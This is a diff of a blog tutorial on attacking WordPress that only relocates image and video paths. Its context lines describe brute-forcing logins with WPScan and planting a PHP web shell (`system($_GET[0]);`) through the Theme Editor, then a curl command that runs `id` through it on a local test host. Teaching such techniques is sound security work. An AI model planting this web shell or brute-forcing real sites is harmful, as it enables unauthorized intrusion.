@@ -4,7 +4,7 @@ description: Ways of enumerating and attacking WordPress Content Management Syst
 categories: [Hacking Web Apps, CMS]
 tags: [CMS]
 image:
-  path: /assets/blogimages/HackingWebApps/wordpress.png
+  path: /assets/blogimages/HackingWebApps/CMS/wordpress/wordpress.png
   alt: Attacking WordPress
 ---
 
@@ -191,7 +191,7 @@ ap All plugins
 ```
 Example usage:
 <br>
-![Desktop View](/assets/blogimages/HackingWebApps/wpscan1.gif)
+![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wpscan1.gif)
 _Using WPScan tool for enumeration_
 
 ## Exploitation
@@ -205,7 +205,7 @@ For login attacks I recommend using WPScan. The tool can perform two types of br
 <br>
 Example usage:
 <br>
-![Desktop View](/assets/blogimages/HackingWebApps/wpscan2.gif)
+![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wpscan2.gif)
 _Using WPScan tool for login brute force_
 
 
@@ -213,14 +213,14 @@ _Using WPScan tool for login brute force_
 ### Code Execution
 
 After getting access to admin dashboard the attacker can navigate to Appearance->Theme Editor to edit PHP source code directly of any .php file by inserting `system($_GET[0]);`
-![Desktop View](/assets/blogimages/HackingWebApps/wordpressRCE.png)
+![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wordpressRCE.png)
 
 After saving the edited contents, the attacker can execute code:
 
 `curl http://127.0.0.1/wp-content/themes/twentynineteen/404.php?0=id`<br><br>
 Example attack:
 <video width="100%" preload="auto" muted controls>
-    <source src="/assets/blogimages/HackingWebApps/wprceattack.mp4" type="video/mp4">
+    <source src="/assets/blogimages/HackingWebApps/CMS/wordpress/wprceattack.mp4" type="video/mp4">
 </video>
 
 
@@ -228,9 +228,9 @@ Example attack:
 
 ### Statistics
 Based on [**WPScan**](https://wpscan.com/statistics/) statistics there is still a significant amount of vulnerabilities found every month. Most of them come from plugins.
-![Desktop View](/assets/blogimages/HackingWebApps/wordpressSTATS1.png)
+![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wordpressSTATS1.png)
 _Growing number of vulnerabilities each year_
-![Desktop View](/assets/blogimages/HackingWebApps/wordpressSTATS2.png)
+![Desktop View](/assets/blogimages/HackingWebApps/CMS/wordpress/wordpressSTATS2.png)
 _Most common vulnerable components_
 
 ### Remediation
